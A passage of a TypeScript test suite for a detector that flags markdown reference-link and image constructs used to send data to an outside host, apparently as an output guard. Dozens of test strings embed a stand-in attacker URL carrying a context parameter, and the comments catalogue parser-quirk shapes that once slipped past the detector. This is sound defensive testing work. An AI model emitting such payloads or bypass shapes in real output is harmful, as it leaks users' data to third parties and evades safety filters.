    fullReference: `![build][badge]\n\n[badge]: ${U}\n`,
    collapsed: `![status][]\n\n[status]: ${U}\n`,
    shortcut: `![logo]\n\n[logo]: ${U}\n`,
    imageInLink: `[![badge][img]](https://ci.example.com/job)\n\n[img]: ${U}\n`,
  };
  for (const [id, content] of Object.entries(controls)) {
    expect(`${id}:${detectExfil(content, []).length}`).toBe(`${id}:1`);
  }

  // An allowlisted host inside a container still releases — the allowlist
  // still governs a finding once the definition is one, container or not.
  expect(
    detectExfil(`![logo]\n\n> [logo]: https://cdn.example.org/1.png\n`, [
      "cdn.example.org",
    ]).length,
  ).toBe(0);

  // A space before the colon is not CommonMark definition syntax in any
  // container: the colon-adjacency test the caller runs after the skip is
  // unchanged, so this must stay released, container-prefixed or not.
  for (const [container, prefix] of Object.entries(T89_CONTAINER_PREFIXES)) {
    const content = `![logo]\n\n${prefix}[logo] : ${U}\n`;
    expect(`${container}:${detectExfil(content, []).length}`).toBe(`${container}:0`);
  }

  // Ordinary container prose that merely starts with a marker-shaped
  // character is not a container prefix and must not become one: a bullet
  // character with no following space/tab, and a decimal number with no
  // following space/tab after its `.`, both fail the marker grammar and the
  // line is read exactly as an unrecognised line always was.
  expect(detectExfil(`![logo]\n\n-5 items sold, not [logo]: ${U}\n`, []).length).toBe(
    0,
  );
  expect(detectExfil(`![logo]\n\n3.14 is pi, not [logo]: ${U}\n`, []).length).toBe(0);

  // Ordinary list/quote prose that merely contains an inline link is still
  // not a definition — the container skip only widens where the scan looks
  // for `[`, never what counts as one once it is found.
  for (const prefix of Object.values(T89_CONTAINER_PREFIXES)) {
    expect(
      detectExfil(`${prefix}See [text](${U}) for details\n`, []).length,
    ).toBe(0);
  }
});

// Over-approximation direction (policies.md: "a construct quoted inside a
// code fence still becomes a finding"). This repair only widens where the
// scanner looks for `[` at a line start; it must not narrow the existing
// context-blindness the rest of the floor relies on — a container-prefixed
// definition inside a fenced code block is still flagged, exactly as an
// unprefixed one already was.
test("T89: a container-prefixed definition inside a fenced code block still flags (over-approximation direction preserved)", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  const content = "```\n> [logo]: " + U + "\n```\n\n![logo]\n";
  const matches = detectExfil(content, []);
  expect(matches.length).toBeGreaterThan(0);
  expect(applyRedaction(content, matches)).not.toContain(ATTACKER);
});

// COST (AC/T89). `skipBlockContainerPrefix` must stay linear: every branch
// either breaks immediately or advances at least one character, so one
// line's skip costs at most that line's own length, summed at most
// `content.length` over the whole scan. Measured on a megabyte-scale
// adversarial input built from a long run of alternating nested markers, both
// spread across many lines and concentrated on one pathological line.
test("T89: the block-container skip is linear — megabyte-scale nested markers complete well under a second", () => {
  const BUDGET_MS = 900;
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  const nestedPrefix = "> - 1. ".repeat(40); // deeply nested, alternating, 280 bytes
  const lineCount = 4000; // ~1.1 MB of nested-marker lines
  const shapes: Record<string, string> = {
    manyNestedContainerLines: Array.from(
      { length: lineCount },
      (_, i) => `${nestedPrefix}[k${i}]: https://ok.example.org/x\n`,
    ).join(""),
    // the worst single LINE case: one line, ~1 MB of alternating markers,
    // never resolving to `[` at all.
    oneLineMillionMarkers: "> - 1. ".repeat(150000) + "not a bracket at all\n",
    // the real bypass shape at scale: many nested, allowlisted definitions,
    // then one nested definition carrying the attacker host.
    nestedDefsThenAttacker:
      Array.from(
        { length: 3000 },
        (_, i) => `${nestedPrefix}[k${i}]: https://ok.example.org/x\n`,
      ).join("") +
      `${nestedPrefix}[target]: ${U}\n` +
      "![x][target]\n",
  };
  const slow: string[] = [];
  const timings: string[] = [];
  for (const [id, text] of Object.entries(shapes)) {
    const started = performance.now();
    const matches = detectExfil(text, []);
    const elapsed = performance.now() - started;
    timings.push(`${id}: ${text.length} bytes in ${elapsed.toFixed(1)}ms`);
    if (elapsed >= BUDGET_MS) slow.push(`${id}=${elapsed.toFixed(1)}ms`);
    if (id === "nestedDefsThenAttacker") {
      expect(matches.some((m) => m.value === U)).toBe(true);
    }
  }
  console.log("T89 cost measurement:\n" + timings.join("\n"));
  expect(slow).toEqual([]);
});

// ---------------------------------------------------------------------------
// T90 — closes the narrower residual T89 recorded when it closed the twelve
// single-line block-container cases: a definition whose DESTINATION itself
// wraps to a second physical line, where the continuation line REPEATS a
// block-container marker (`> [ref]:` \ `> URL`), was read wrong —
// `readDefinitionDestination` took the marker byte itself as the destination.
// Reproduced against `marked` (see the scratch oracle referenced in
// RESIDUALS.md/policies.md, not taken on report): the renderer resolves the
// multi-line destination through the repeated marker and fetches the
// attacker host; pre-fix, the detector produced ZERO findings for every case
// in the first test below.
//
// `marked` is the renderer oracle throughout this section: for each row
// checked here the renderer's own `<img src>` (or lack of one) decided
// whether the shape is a genuine bypass, not this file's own reading of the
// grammar. Two results from that oracle shaped which rows are asserted as
// findings versus merely "still flagged, not released" below:
//   - a REPEATED bullet or ordered-list marker on the continuation line does
//     NOT continue the same destination for `marked` — CommonMark reads a
//     repeated list marker as a NEW list item, so `- [ref]:` / `- URL` become
//     two separate `<li>`s and the reference never resolves. Only a REPEATED
//     BLOCKQUOTE marker (`>`) continues the same block content;
//   - an OMITTED marker on the continuation line (true CommonMark lazy
//     continuation) resolves for a bullet list (list continuation is
//     indentation-based, not marker-based) but does NOT resolve for a
//     blockquote (a link reference definition does not get a blockquote's
//     lazy-paragraph-continuation allowance the way a paragraph does).
// Both facts were measured, not assumed, with the scratch probe described
// above. The detector does not need to reproduce this distinction to stay
// sound: `skipBlockContainerPrefix` is reused unchanged from T89, so a
// continuation this floor cannot prove is safe is flagged anyway — the
// over-approximation direction this file has used throughout. It only needs
// to reproduce the distinction to know which rows in the tests below assert
// "the renderer fetches, so this must be a finding" versus "the renderer
// does not fetch, so a finding here is an accepted over-approximation, not a
// contract".
// ---------------------------------------------------------------------------

test("T90: a definition whose destination wraps behind a repeated container marker is a finding", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  // Every row here was measured against `marked` to produce an `<img src>`
  // naming the attacker host — a genuine renderer fetch, not an
  // over-approximation. Each failed to produce any finding before this fix.
  const fetched: Record<string, string> = {
    // The reported bypass itself, in all four CommonMark image spellings —
    // the same discipline T89 used for its twelve single-line spellings.
    fullReference: `![alt][ref]\n\n> [ref]:\n> ${U}\n`,
    collapsed: `![alt][]\n\n> [alt]:\n> ${U}\n`,
    shortcut: `![alt]\n\n> [alt]:\n> ${U}\n`,
    imageInLink: `[![alt][ref]](https://ci.example.com/job)\n\n> [ref]:\n> ${U}\n`,
    // Nested containers on the opening line, fewer markers repeated on the
    // continuation — still resolves for `marked` because list continuation
    // inside the blockquote only needs the blockquote's own marker repeated.
    nestedFewerOnContinuation: `![alt][ref]\n\n> - 1. [ref]:\n> ${U}\n`,
    // Trailing space between the colon and the wrap: the existing
    // non-newline whitespace skip and the new newline-crossing skip compose.
    trailingSpaceBeforeWrap: `![alt][ref]\n\n> [ref]: \n> ${U}\n`,
    // A title on a FURTHER wrapped, container-prefixed line must not defeat
    // finding the destination itself, one line closer.
    titleOnFurtherWrappedLine: `![alt][ref]\n\n> [ref]:\n> ${U}\n> "t"\n`,
  };

  for (const [id, content] of Object.entries(fetched)) {
    const matches = detectExfil(content, []);
    expect(`${id}:${matches.length > 0}`).toBe(`${id}:true`);
    expect(`${id}:${matches.some((m) => m.value === U)}`).toBe(`${id}:true`);
    expect(`${id}:${matches.every((m) => m.policyId === "egress.reference-link-exfil")}`).toBe(
      `${id}:true`,
    );
    expect(`${id}:${applyRedaction(content, matches).includes(ATTACKER)}`).toBe(
      `${id}:false`,
    );

    // Same four public boundaries T89 drove this through — the detector is
    // not where this floor is proved.
    const serialized = JSON.stringify({ note: content });
    const persisted = prepareOutputForPersistence(GUARD_PASS, serialized);
    expect(`${id}:${persisted.allowed}`).toBe(`${id}:true`);
    if (persisted.allowed) {
      expect(`${id}:${persisted.content.includes(ATTACKER)}`).toBe(`${id}:false`);
    }
    const transported = validateOutputForTransport({
      format: "json",
      value: { note: content },
    });
    expect(`${id}:${transported.ok}`).toBe(`${id}:true`);
    if (transported.ok) {
      expect(`${id}:${transported.text.includes(ATTACKER)}`).toBe(`${id}:false`);
      expect(`${id}:${transported.redaction.state}`).toBe(`${id}:redacted`);
    }
  }
});

test("T90: controls are unaffected — same-line definitions, an unprefixed wrap, and a bullet's lazy (marker-omitted) continuation", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  // These were already findings before T90 and must stay exactly that: this
  // repair only changes what happens when the destination reader crosses a
  // newline, and none of these cross one behind a marker it could misread.
  const controls: Record<string, string> = {
    noContainer_sameLine: `![alt][ref]\n\n[ref]: ${U}\n`,
    noContainer_wraps: `![alt][ref]\n\n[ref]:\n${U}\n`,
    blockquote_sameLine_T89: `![alt][ref]\n\n> [ref]: ${U}\n`,
    bullet_sameLine_T89: `![alt][ref]\n\n- [ref]: ${U}\n`,
    ordered_sameLine_T89: `![alt][ref]\n\n1. [ref]: ${U}\n`,
    // A bullet's own lazy continuation (marker OMITTED on the destination
    // line) already resolved before T90 — CommonMark list continuation is
    // indentation-based, so the old plain `\s*` crossed the newline with
    // nothing to misread. Measured against `marked`: this genuinely fetches.
    bulletLazyContinuation: `![alt][ref]\n\n- [ref]:\n${U}\n`,
  };
  for (const [id, content] of Object.entries(controls)) {
    const matches = detectExfil(content, []);
    expect(`${id}:${matches.length}`).toBe(`${id}:1`);
    expect(`${id}:${matches[0]?.value}`).toBe(`${id}:${U}`);
  }

  // A blockquote's lazy continuation (marker OMITTED) does NOT resolve for
  // `marked` — a link reference definition does not inherit a paragraph's
  // lazy-continuation allowance. The detector already over-approximated this
  // one before T90 (the plain `\s*` crossed the newline unobstructed) and
  // continues to; asserted here so a future change to the newline-crossing
  // skip cannot silently start releasing it instead.
  expect(detectExfil(`![alt][ref]\n\n> [ref]:\n${U}\n`, []).length).toBeGreaterThan(0);

  // The allowlist still governs a wrapped, container-prefixed destination
  // exactly as it governs any other finding.
  expect(
    detectExfil(`![logo]\n\n> [logo]:\n> https://cdn.example.org/1.png\n`, [
      "cdn.example.org",
    ]).length,
  ).toBe(0);
});

test("T90: shapes the renderer does not resolve are still flagged, not released — over-approximation, not a contract", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  // Measured against `marked`: none of these four produce an `<img src>` for
  // the attacker host — a repeated LIST marker starts a new list item rather
  // than continuing the destination, and mismatched markers across the two
  // lines fare no better. `skipBlockContainerPrefix` does not model that
  // distinction (T89 already applies it order- and count-unconstrained on
  // the label side, for the same reason), so these are flagged anyway. That
  // is this floor's stated direction — over-flag, never release — and this
  // test pins it as a fact about this repair rather than a silent side
  // effect: a future change is free to still flag these, but must not start
  // asserting the renderer fetches them.
  const notActuallyFetched: Record<string, string> = {
    bulletRepeatedMarker_newListItem: `![alt][ref]\n\n- [ref]:\n- ${U}\n`,
    orderedRepeatedMarker_newListItem: `![alt][ref]\n\n1. [ref]:\n1. ${U}\n`,
    mismatchedMarkers_bulletThenBlockquote: `![alt][ref]\n\n- [ref]:\n> ${U}\n`,
    mismatchedMarkers_blockquoteThenBullet: `![alt][ref]\n\n> [ref]:\n- ${U}\n`,
  };
  for (const [id, content] of Object.entries(notActuallyFetched)) {
    expect(`${id}:${detectExfil(content, []).length > 0}`).toBe(`${id}:true`);
  }
});

test("T90: a tab after the blockquote marker on the continuation line still lands on the real URL, not the marker byte", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  // `skipBlockContainerPrefix` consumes at most one SPACE after a blockquote
  // `>` as the marker's own trailing whitespace, never a tab — but a tab
  // there is still ordinary leading whitespace, consumed by that same
  // function's own per-round whitespace skip on its next pass. Either path
  // must land on the real URL; the destination must never be read as `>` or
  // as a truncated one-byte span.
  const content = `![alt][ref]\n\n> [ref]:\n>\t${U}\n`;
  const matches = detectExfil(content, []);
  expect(matches.some((m) => m.value === U)).toBe(true);
});

test("T90: a wrapped, container-prefixed destination inside a fenced code block still flags (over-approximation direction preserved)", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  const content = "```\n> [logo]:\n> " + U + "\n```\n\n![logo]\n";
  const matches = detectExfil(content, []);
  expect(matches.length).toBeGreaterThan(0);
  expect(applyRedaction(content, matches)).not.toContain(ATTACKER);
});

// COST (T90). `skipDestinationLeadingWhitespace` composes two already-linear
// costs — see the comment above it in exfil.ts — so it must stay linear too.
// Measured on megabyte-scale adversarial input built from many reference
// definitions whose destination wraps behind a long, nested marker run, plus
// the shared-offset shape T84#F-001 measured (many line-start `[` resolving
// to one shared `]:`), now with that shared destination itself wrapped
// behind a nested marker run.
test("T90: the destination-side block-container skip is linear — megabyte-scale wrapped, nested-marker destinations complete well under a second", () => {
  const BUDGET_MS = 900;
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  const nestedPrefix = "> - 1. ".repeat(40); // 280 bytes, deeply nested, alternating
  const lineCount = 3500; // ~1.1 MB across many wrapped, nested-marker definitions
  const shapes: Record<string, string> = {
    manyWrappedNestedDefs: Array.from(
      { length: lineCount },
      (_, i) => `[k${i}]:\n${nestedPrefix}https://ok.example.org/x\n`,
    ).join(""),
    // The real bypass shape at scale: many wrapped, nested, allowlisted
    // definitions, then one wrapped nested definition carrying the attacker
    // host, and its use.
    wrappedNestedDefsThenAttacker:
      Array.from(
        { length: 3000 },
        (_, i) => `[k${i}]:\n${nestedPrefix}https://ok.example.org/x\n`,
      ).join("") + `[target]:\n${nestedPrefix}${U}\n` + "![x][target]\n",
    // T84#F-001's shared-offset shape: every one of 20 000 line-start `[`
    // resolves to the SAME `]:`, and that shared destination now wraps
    // behind a nested marker run before failing to parse (a huge whitespace
    // tail with no destination at all) — stresses the memo cache and the
    // new skip together.
    sharedOffsetWrappedThenFails:
      "[a\n".repeat(20000) + "]:\n" + nestedPrefix + " ".repeat(100000),
  };
  const slow: string[] = [];
  const timings: string[] = [];
  for (const [id, text] of Object.entries(shapes)) {
    const started = performance.now();
    const matches = detectExfil(text, []);
    const elapsed = performance.now() - started;
    timings.push(`${id}: ${text.length} bytes in ${elapsed.toFixed(1)}ms`);
    if (elapsed >= BUDGET_MS) slow.push(`${id}=${elapsed.toFixed(1)}ms`);
    if (id === "wrappedNestedDefsThenAttacker") {
      expect(matches.some((m) => m.value === U)).toBe(true);
    }
  }
  console.log("T90 cost measurement:\n" + timings.join("\n"));
  expect(slow).toEqual([]);
});

// ---------------------------------------------------------------------------
// T91 — a 21st shape of the same block-container bypass class, found by an
// independent managed review: a reference-definition or reference-use LABEL
// (the `[...]` bracketed text) that spans a line ending inside a blockquote
// or other block container, with the container marker REPEATED on the
// continuation line, is never matched — even though `marked` joins the two
// physical lines into one label and resolves the reference. T89 taught the
// line-start scan to cross a container prefix; T90 taught the DESTINATION
// reader to do the same; nobody extended the same skip across a newline
// inside the LABEL itself, on either the definition side (`[label\n>
// cont]: URL`) or the use side (`[label\n> cont][ref]` / `[label\n>
// cont]` / `![label\n> cont][ref]`). Reproduced against `marked`, not
// inferred: every shape below produces an `<img src>` naming the attacker
// host pre-fix, while `detectExfil` produced ZERO findings for every one of
// them — all four public boundaries passed the payload with
// `redaction.state:"none"`.
//
// The two sides bypass INDEPENDENTLY (a wrapped definition with an
// unwrapped use still bypasses, and a wrapped use with an unwrapped
// definition still bypasses), because each side computes its own key
// through `normaliseLabel`, and a raw span carrying an un-stripped `\n> `
// artifact normalises to a key the other, correctly-single-line side never
// produces. See the isolation tests below for each side proved alone.
// ---------------------------------------------------------------------------

test("T91: a reference LABEL that wraps behind a repeated container marker is a finding, in every CommonMark image spelling", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  // Every row here was measured against `marked` to produce an `<img src>`
  // naming the attacker host — a genuine renderer fetch, not an
  // over-approximation — and produced ZERO findings before this fix.
  const fetched: Record<string, string> = {
    // The reported bypass itself: a shortcut reference whose label (the
    // description) wraps behind a repeated blockquote marker.
    shortcut: `![foo bar]\n\n> [foo\n> bar]: ${U}\n`,
    // The full reference form: the USE side's `[ref]` half is a single
    // line; the DEFINITION side's label wraps. Isolated further below.
    fullReference: `![alt][foo bar]\n\n> [foo\n> bar]: ${U}\n`,
    // Collapsed: the label is the description, same as shortcut, with an
    // explicit empty `[]` use.
    collapsed: `![foo bar][]\n\n> [foo\n> bar]: ${U}\n`,
    // Image nested inside a link — the README badge idiom.
    imageInLink: `[![foo bar]](https://ci.example.com/job)\n\n> [foo\n> bar]: ${U}\n`,
    // Doubly-nested blockquote: order/nesting is unconstrained, same as T89.
    nestedQuote: `![foo bar]\n\n> > [foo\n> > bar]: ${U}\n`,
    // Three physical lines, not just two.
    threeLineWrap: `![foo bar baz]\n\n> [foo\n> bar\n> baz]: ${U}\n`,
    // The destination itself is angle-bracketed; the label-side fix must
    // compose with T90's destination-side fix, not just coexist with it.
    angleDestination: `![alt][foo bar]\n\n> [foo\n> bar]: <${U}>\n`,
    // CRLF line endings throughout, mirroring the CRLF discipline the file
    // already applies via `LINE_TERMINATORS`.
    crlf: `![foo bar]\r\n\r\n> [foo\r\n> bar]: ${U}\r\n`,
  };

  for (const [id, content] of Object.entries(fetched)) {
    const matches = detectExfil(content, []);
    expect(`${id}:${matches.length > 0}`).toBe(`${id}:true`);
    expect(`${id}:${matches.some((m) => m.value === U)}`).toBe(`${id}:true`);
    expect(
      `${id}:${matches.every((m) => m.policyId === "egress.reference-link-exfil")}`,
    ).toBe(`${id}:true`);
    expect(`${id}:${applyRedaction(content, matches).includes(ATTACKER)}`).toBe(
      `${id}:false`,
    );

    // Same four public boundaries T89/T90 drove this through.
    const serialized = JSON.stringify({ note: content });
    const persisted = prepareOutputForPersistence(GUARD_PASS, serialized);
    expect(`${id}:${persisted.allowed}`).toBe(`${id}:true`);
    if (persisted.allowed) {
      expect(`${id}:${persisted.content.includes(ATTACKER)}`).toBe(`${id}:false`);
    }
    const transported = validateOutputForTransport({
      format: "json",
      value: { note: content },
    });
    expect(`${id}:${transported.ok}`).toBe(`${id}:true`);
    if (transported.ok) {
      expect(`${id}:${transported.text.includes(ATTACKER)}`).toBe(`${id}:false`);
      expect(`${id}:${transported.redaction.state}`).toBe(`${id}:redacted`);
    }
  }
});

test("T91: a DEFINITION-side-only label wrap is a finding (the use side stays a single, unwrapped line)", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  // The use side, `[foo bar]`, is one physical line with no container
  // marker anywhere near it. Only the DEFINITION's label wraps, behind a
  // mixed blockquote+list marker on the opening line and a blockquote-only
  // marker on the continuation (the list's own lazy, indentation-based
  // continuation) — proving the fix is not specific to a bare `>` wrap.
  // Measured against `marked`: this resolves and fetches the attacker host.
  const content = `![alt][foo bar]\n\n> - [foo\n>   bar]: ${U}\n`;
  const matches = detectExfil(content, []);
  expect(matches.length).toBeGreaterThan(0);
  expect(matches.some((m) => m.value === U)).toBe(true);
  expect(applyRedaction(content, matches)).not.toContain(ATTACKER);
});

test("T91: a USE-side-only (reference) label wrap is a finding (the definition stays a single, unwrapped line)", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  // The definition, `[foo bar]: URL`, is one physical line — already
  // covered by T89. Only the USE side's `[ref]` half wraps, behind a
  // repeated blockquote marker, inside the same blockquote as the
  // definition. Measured against `marked`: this resolves and fetches the
  // attacker host.
  const content = `> ![alt][foo\n> bar]\n>\n> [foo bar]: ${U}\n`;
  const matches = detectExfil(content, []);
  expect(matches.length).toBeGreaterThan(0);
  expect(matches.some((m) => m.value === U)).toBe(true);
  expect(applyRedaction(content, matches)).not.toContain(ATTACKER);
});

test("T91: the pruning-bound relaxation is necessary, not cosmetic — a deeply nested container whose raw marker bytes alone exceed any defined key's length is still a finding", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  // `readLabel`'s O(1) pre-filter rejects a candidate span when its RAW
  // non-whitespace count exceeds the longest defined key — a NECESSARY
  // condition only while normalisation cannot delete a non-whitespace byte.
  // Every other T91 case above happens to keep that raw count small enough
  // that the filter would have let it through even unfixed (each marker run
  // is short relative to its key), so none of them alone proves the pruning
  // bound itself needed relaxing. This one is built specifically so it does:
  // 200 nested blockquote levels contribute 200 extra `>` bytes to the raw
  // span on top of the label text, while the only key this document defines
  // (`target x`, 8 characters) is far shorter. Confirmed by direct
  // measurement during development: with `normaliseLabel`'s marker-stripping
  // fix applied but the pruning-bound relaxation in `readLabel` reverted,
  // this exact shape still produces ZERO findings — the raw count rejects
  // the span before normalisation ever runs. Measured against `marked`: this
  // resolves and fetches the attacker host.
  const nestedQuote = "> ".repeat(200);
  const content = `${nestedQuote}![alt][target\n${nestedQuote}x]\n\n[target x]: ${U}\n`;
  const matches = detectExfil(content, []);
  expect(matches.length).toBeGreaterThan(0);
  expect(matches.some((m) => m.value === U)).toBe(true);
  expect(applyRedaction(content, matches)).not.toContain(ATTACKER);
});

test("T91: controls are unaffected — no-container label wrap, single-line label in quote (T89), destination wrap in quote (T90)", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  const controls: Record<string, string> = {
    noContainer_labelWraps: `![foo\nbar]\n\n[foo\nbar]: ${U}\n`,
    singleLineLabel_inQuote_T89: `![foo]\n\n> [foo]: ${U}\n`,
    destWraps_inQuote_T90: `![foo]\n\n> [foo]:\n> ${U}\n`,
    // A bullet's own lazy (indentation-based, marker-omitted) continuation
    // already resolved a wrapped label before this fix — no marker byte
    // was ever misread, so this repair must not move it.
    bulletLazyContinuation_labelWraps: `![foo bar]\n\n- [foo\n  bar]: ${U}\n`,
  };
  for (const [id, content] of Object.entries(controls)) {
    const matches = detectExfil(content, []);
    expect(`${id}:${matches.length}`).toBe(`${id}:1`);
    expect(`${id}:${matches[0]?.value}`).toBe(`${id}:${U}`);
  }
});

test("T91: shapes the renderer does not resolve are still flagged, not released — over-approximation, not a contract", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  // Measured against `marked`: none of these produce an `<img src>` for the
  // attacker host — a REPEATED list marker (bullet or ordered) on a label's
  // continuation line starts a NEW list item rather than continuing the
  // same label, exactly the distinction T90 already documented for the
  // destination side. `skipBlockContainerPrefix` does not model that
  // distinction (by design, same as T89/T90), so these are flagged anyway —
  // this floor's stated direction is over-flag, never release. Pinned here
  // as a fact about this repair, not a silent side effect.
  const notActuallyFetched: Record<string, string> = {
    bulletRepeatedMarker_newListItem: `![alt][foo bar]\n\n- [foo\n- bar]: ${U}\n`,
    mixedQuoteThenBulletRepeated_newListItem: `![alt][foo bar]\n\n> - [foo\n> - bar]: ${U}\n`,
  };
  for (const [id, content] of Object.entries(notActuallyFetched)) {
    expect(`${id}:${detectExfil(content, []).length > 0}`).toBe(`${id}:true`);
  }
});

test("T91: a label wrap inside a fenced code block still flags (over-approximation direction preserved)", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  const content = "```\n> [foo\n> bar]: " + U + "\n```\n\n![foo bar]\n";
  const matches = detectExfil(content, []);
  expect(matches.length).toBeGreaterThan(0);
  expect(applyRedaction(content, matches)).not.toContain(ATTACKER);
});

// COST (T91). `normaliseLabel`'s new per-line skip, and the matching skip
// `indexContent` now runs to keep the pruning bound in `readLabel` sound
// (see the comment there), must both stay linear — see the comments above
// `normaliseLabel` and inside `indexContent` in exfil.ts for the proof.
// Measured on megabyte-scale adversarial input: many short labels each
// wrapped once behind a long nested-marker run, AND one single label
// spanning thousands of lines each carrying a nested-marker run — the
// worst case for one `normaliseLabel` call's own cost.
test("T91: the label-side block-container skip is linear — megabyte-scale wrapped, nested-marker labels complete well under a second", () => {
  const BUDGET_MS = 900;
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  const nestedPrefix = "> - 1. ".repeat(40); // 280 bytes, deeply nested, alternating
  const lineCount = 3000; // ~1 MB across many wrapped, nested-marker labels
  const manyLinesInOneLabel = 4000; // one label spanning this many wrapped lines
  const shapes: Record<string, string> = {
    manyWrappedNestedLabels: Array.from(
      { length: lineCount },
      (_, i) => `[k${i}\n${nestedPrefix}x${i}]: https://ok.example.org/x\n`,
    ).join(""),
    // One single label spanning many lines, each carrying a nested-marker
    // run — the worst case for ONE `normaliseLabel` call.
    oneLabelManyWrappedLines:
      "[" +
      Array.from(
        { length: manyLinesInOneLabel },
        (_, i) => `l${i}\n${nestedPrefix}`,
      ).join("") +
      "]: https://ok.example.org/x\n",
    // The real bypass shape at scale: many wrapped, nested, allowlisted
    // labels, then one wrapped, nested-marker label carrying the attacker
    // host, defined and used.
    wrappedLabelsThenAttacker:
      Array.from(
        { length: 2500 },
        (_, i) => `[k${i}\n${nestedPrefix}x${i}]: https://ok.example.org/x\n`,
      ).join("") +
      `![alt][target\n${nestedPrefix}x]\n\n[target\n${nestedPrefix}x]: ${U}\n`,
  };
  const slow: string[] = [];
  const timings: string[] = [];
  for (const [id, text] of Object.entries(shapes)) {
    const started = performance.now();
    const matches = detectExfil(text, []);
    const elapsed = performance.now() - started;
    timings.push(`${id}: ${text.length} bytes in ${elapsed.toFixed(1)}ms`);
    if (elapsed >= BUDGET_MS) slow.push(`${id}=${elapsed.toFixed(1)}ms`);
    if (id === "wrappedLabelsThenAttacker") {
      expect(matches.some((m) => m.value === U)).toBe(true);
    }
  }
  console.log("T91 cost measurement:\n" + timings.join("\n"));
  expect(slow).toEqual([]);
});

// ---------------------------------------------------------------------------
// T92 — a 22nd shape of the block-container bypass class, and the one
// RESIDUALS.md recorded as an open residual after T91: a reference USE's
// SECOND bracket (`![desc][HERE]`) whose only content, once you cross the
// line ending, is a REPEATED container marker and nothing else —
// `![foo bar][\n> ]`, `![foo bar][\n- ]`, every marker kind T89-T91 already
// enumerate, nested or not, LF or CRLF. `spanHasNonWhitespace` decided
// whether that bracket was an explicit full-reference label from the RAW,
// un-stripped non-whitespace byte count, so the marker byte alone made it
// answer "yes" — the full-reference branch ran, `readLabel` then normalised
// the very same bytes (which DOES strip the marker, per T91) down to `""`,
// and an empty label matches no key in the table. `marked` resolves the
// construct through its SHORTCUT fallback instead (the description, not the
// hollow second bracket) and fetches. Reproduced against `marked`, not
// inferred: every row in the first test below produces an `<img src>` naming
// the attacker host pre-fix, while `detectExfil` produced ZERO findings for
// every one of them.
// ---------------------------------------------------------------------------

test("T92: a reference USE whose second bracket is only a repeated container marker still resolves via the renderer's shortcut fallback, and is a finding", () => {
  const U = `https://${ATTACKER}/p?ctx=CTX`;
  // Every row measured against `marked` to produce an `<img src>` naming the
  // attacker host — a genuine renderer fetch via the shortcut fallback, not
  // an over-approximation — and produced ZERO findings before this fix.
  const fetched: Record<string, string> = {
    // The exact bypass named by the orchestrator, all three variants.
    blockquote_topLevelDefinition: `![foo bar][\n> ]\n\n[foo bar]: ${U}\n`,
    blockquote_quotedDefinition: `![foo bar][\n> ]\n\n> [foo bar]: ${U}\n`,
    bullet_topLevelDefinition: `![foo bar][\n- ]\n\n[foo bar]: ${U}\n`,
    // Enumerated further: every marker kind CommonMark defines for a
    // non-indented container (T89's own enumeration), alone.
    ordered_dot: `![foo bar][\n1. ]\n\n[foo bar]: ${U}\n`,
    ordered_paren: `![foo bar][\n1) ]\n\n[foo bar]: ${U}\n`,
    asteriskBullet: `![foo bar][\n* ]\n\n[foo bar]: ${U}\n`,
    plusBullet: `![foo bar][\n+ ]\n\n[foo bar]: ${U}\n`,
    // Nesting is unconstrained, same as T89/T90/T91.
    nestedBlockquote: `![foo bar][\n> > ]\n\n[foo bar]: ${U}\n`,
    mixedQuoteThenBullet: `![foo bar][\n> - ]\n\n[foo bar]: ${U}\n`,
    // The definition itself doubly nested, independent of the use's own
    // (unnested) marker.
    nestedQuotedDefinition: `![foo bar][\n> ]\n\n> > [foo bar]: ${U}\n`,
    // CRLF line endings throughout, the same discipline T89-T91 each pinned.
    crlfBlockquote: `![foo bar][\r\n> ]\r\n\r\n[foo bar]: ${U}\r\n`,
    crlfBullet: `![foo bar][\r\n- ]\r\n\r\n[foo bar]: ${U}\r\n`,
  };

  for (const [id, content] of Object.entries(fetched)) {
    const matches = detectExfil(content, []);
    expect(`${id}:${matches.length > 0}`).toBe(`${id}:true`);
    expect(`${id}:${matches.some((m) => m.value === U)}`).toBe(`${id}:true`);
    expect(
      `${id}:${matches.every((m) => m.policyId === "egress.reference-link-exfil")}`,
    ).toBe(`${id}:true`);
    expect(`${id}:${applyRedaction(content, matches).includes(ATTACKER)}`).toBe(
      `${id}:false`,
    );

    // Same four public boundaries T89-T91 drove this through.
    const serialized = JSON.stringify({ note: content });
    const persisted = prepareOutputForPersistence(GUARD_PASS, serialized);
    expect(`${id}:${persisted.allowed}`).toBe(`${id}:true`);
    if (persisted.allowed) {
      expect(`${id}:${persisted.content.includes(ATTACKER)}`).toBe(`${id}:false`);
    }
    const transported = validateOutputForTransport({
      format: "json",
      value: { note: content },
    });
    expect(`${id}:${transported.ok}`).toBe(`${id}:true`);
    if (transported.ok) {
      expect(`${id}:${transported.text.includes(ATTACKER)}`).toBe(`${id}:false`);
      expect(`${id}:${transported.redaction.state}`).toBe(`${id}:redacted`);
    }
  }
});

test("T92: the DEFINITION-side analogue of the same degenerate shape does not need this fix — a reference definition whose own label is only a repeated marker registers no key, on either side of the change", () => {
  // Measured against `marked`: this does NOT resolve to the attacker host —
  // the marker-only definition label also normalises to empty on the
  // renderer's side, so it defines nothing usable, and the unrelated
  // `![foo bar]` shortcut a few lines down resolves against the OTHER,
  // properly-defined `[foo bar]: https://ok.example.org/x` instead.
  // `readReferenceDefinitions`'s `register` already runs the raw label
  // through `normaliseLabel` directly — the same function this fix reuses —
  // and rejects an empty result before ever storing a key, so there is no
  // second raw-byte-counting site on the definition side to carry T92's
  // mistake. Pinned as a control, not inferred.
  const attackerUrl = `https://${ATTACKER}/p?ctx=CTX`;
  const content =
    `[\n> ]: ${attackerUrl}\n\n` +
